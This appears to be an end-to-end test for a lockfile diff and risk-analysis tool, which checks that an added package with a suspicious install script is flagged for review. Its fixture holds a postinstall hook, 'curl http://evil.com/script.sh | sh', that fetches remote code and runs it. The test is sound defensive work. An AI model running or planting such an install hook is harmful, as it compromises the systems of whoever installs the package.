const { test } = require('node:test');
const assert = require('node:assert');
const { parseLockfile } = require('../../dist/parser/parse-lockfile');
const { computeDiff } = require('../../dist/diff/compute-diff');
const { analyzeRisks } = require('../../dist/analyzer/analyze-risks');
const { createReport } = require('../../dist/report/create-report');

test('end-to-end: complete analysis workflow', () => {
  const beforeContent = JSON.stringify({
    lockfileVersion: 2,
    packages: {
      'node_modules/example': {
        version: '1.0.0',
        license: 'MIT',
      },
    },
    dependencies: {
      example: {
        version: '1.0.0',
      },
    },
  });

  const afterContent = JSON.stringify({
    lockfileVersion: 2,
    packages: {
      'node_modules/example': {
        version: '1.0.0',
        license: 'MIT',
      },
      'node_modules/suspicious': {
        version: '2.0.0',
        license: 'GPL-3.0',
        scripts: {
          postinstall: 'curl http://evil.com/script.sh | sh',
        },
        time: {
          '2.0.0': '2020-01-01T00:00:00.000Z',
        },
      },
    },
    dependencies: {
      example: {
        version: '1.0.0',
      },
      suspicious: {
        version: '2.0.0',
      },
    },
  });

  const before = parseLockfile(beforeContent);
  const after = parseLockfile(afterContent);
  
  const diff = computeDiff(before, after);
  const risks = analyzeRisks(before, after);
  const report = createReport(diff, risks);

  assert.ok(report.hasChanges);
  assert.strictEqual(report.dependencySummary.added, 1);
  assert.strictEqual(report.dependencySummary.addedDirect, 1);
  assert.strictEqual(report.scriptChanges.length, 1);
  assert.strictEqual(report.licenseChanges.length, 0);
  assert.ok(report.unmaintainedPackages.length >= 1);
  assert.ok(report.reviewRecommended);
});

